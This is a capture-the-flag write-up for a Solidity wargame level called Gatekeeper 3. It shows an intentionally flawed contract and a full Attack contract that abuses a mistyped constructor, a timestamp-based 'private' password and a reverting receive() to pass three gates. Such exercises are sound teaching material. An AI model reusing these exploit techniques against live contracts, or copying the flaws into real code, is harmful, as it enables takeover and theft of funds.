# Gatekeeper 3

## Challenge

You get a contract and want to become the entrant.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}
```

## Solution

The contract needs you to call the enter() function to become the entrant. The function is restricted by the 3 modifiers gateOne, gateTwo, and gateThree, which you need to pass, to be able to solve the challenge. 

### gateOne

```solidity
modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
}
```

The first gate can easily be circumvented it checks for the msg.sender being the owner, but the tx.origin not being the owner. 

The owner can be overwritten thanks to a typo in the constructor. As it's called "function construct0r()" instead of "constructor()" it is treated like a normal function.

But now we still have to check our message.sender != tx.origin. We can achieve this by calling the construct0r as wekĺl as the enter function through a contract. 

### gateTwo

```solidity
modifier gateTwo() {
    require(allowEntrance == true);
    _;
}
```

To pass through this gate, we need to know the value of the password. As this is initally set to the block.timestamp we could check the constructor transaction for when it was done, or read out the private variable ourself. 

We can also exploit a few other ways to get the allown even easier, as when you enter the wrong the password gets set to the actual block.timestamp. So if we call the function twice, once with a random val to set it to the actual timestamp and then again with the current timestamp, within one transaction, we are able to set allowEntrance to true. This works because, as one transaction can't overlap into another block, the block.timestamp is always the same. 

### gateThree

```solidity
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
}
```

this first check for it's own balance being bigger than 0.001 ether. We can get around this by just sending it 0.002 ether using its receive function.

```solidity
address(target).call{value: 0.002 ether}("");
```

Now we need to make the receive() function of our msg.sender revert.

```solidity
receive() external payable
{
    //revert so .send() returns false
    revert();
}
```

### Exploit

Finally we combine all the functions to make the call pass


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract Attack
{
    GatekeeperThree target;

    constructor (address payable _target) payable
    {
        require(msg.value == 0.002 ether);
        target = GatekeeperThree(_target);
    }

    function letsAGo() public
    {
        //make yourself the owner to pass gate1
        target.construct0r();

        // create trick & get allowance for gate2
        target.createTrick();
        target.getAllowance(block.timestamp);

        //send some money to pass gate3
        address(target).call{value: 0.002 ether}("");

        //call the enter function
        target.enter();
    }

    receive() external payable
    {
        //revert so .send() returns false
        revert();
    }
}
```

